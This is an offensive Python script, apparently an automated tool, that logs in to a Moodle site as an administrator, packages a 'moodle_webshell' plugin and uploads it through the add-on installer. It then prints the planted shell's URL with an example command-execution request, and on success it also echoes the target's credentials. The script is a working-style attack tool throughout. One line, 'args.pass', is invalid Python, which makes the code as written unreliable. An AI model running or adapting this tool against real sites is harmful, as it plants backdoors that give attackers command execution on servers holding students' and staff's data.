#!/usr/bin/env python3
import requests
import zipfile
import os
import argparse
from bs4 import BeautifulSoup

def zip_plugin_folder(source_dir, output_zip):
    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                full_path = os.path.join(root, file)
                rel_path = os.path.relpath(full_path, source_dir)
                zf.write(full_path, arcname=os.path.join("moodle_webshell", rel_path))
    print(f"[+] Plugin zipped: {output_zip}")

def login(session, base_url, username, password):
    login_url = f"{base_url}/login/index.php"
    res = session.get(login_url, verify=False)
    token = ""
    soup = BeautifulSoup(res.text, "html.parser")
    token_tag = soup.find("input", {"name": "logintoken"})
    if token_tag:
        token = token_tag.get("value")

    data = {
        "username": username,
        "password": password,
        "logintoken": token
    }
    response = session.post(login_url, data=data, verify=False)
    return "dashboard" in response.url or "login/index.php" not in response.url

def upload_plugin(session, base_url, zip_path):
    upload_url = f"{base_url}/admin/tool/installaddon/index.php"
    res = session.get(upload_url, verify=False)
    soup = BeautifulSoup(res.text, "html.parser")
    sesskey = soup.find("input", {"name": "sesskey"}).get("value")

    with open(zip_path, 'rb') as f:
        files = {
            'repo_upload_file': (os.path.basename(zip_path), f, 'application/zip'),
        }
        data = {
            'title': '',
            'itemid': '999999999',
            'author': '',
            'license': 'allrightsreserved',
            'sesskey': sesskey,
            'repo_id': 4,
            'p': '',
            'env': 'filemanager',
            'action': 'upload'
        }
        resp = session.post(f"{base_url}/repository/repository_ajax.php?action=upload", files=files, data=data, verify=False)
        return resp.ok

def main():
    parser = argparse.ArgumentParser(description="Auto Moodle Webshell Uploader")
    parser.add_argument('--url', required=True, help="Base URL of the Moodle site")
    parser.add_argument('--user', required=True, help="Admin username")
    parser.add_argument('--pass', required=True, help="Admin password")
    args = parser.parse_args()

    plugin_folder = "moodle_webshell"
    zip_file = "moodle_webshell.zip"

    if not os.path.exists(zip_file):
        zip_plugin_folder(plugin_folder, zip_file)

    with requests.Session() as s:
        s.headers.update({'User-Agent': 'Mozilla/5.0'})
        try:
            if login(s, args.url, args.user, args.pass):
                print(f"[+] Login success ✅ {args.url}/login/index.php|{args.user}|{args.pass}")
                if upload_plugin(s, args.url, zip_file):
                    shell_url = f"{args.url}/local/moodle_webshell/webshell.php"
                    print(f"[+] Upload webshell ✅ {shell_url}")
                    print(f"[+] Access: {shell_url}?action=exec&cmd=id")
                else:
                    print("[-] Upload failed ❌")
            else:
                print(f"[-] {args.url} => Gagal login ❌")
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()
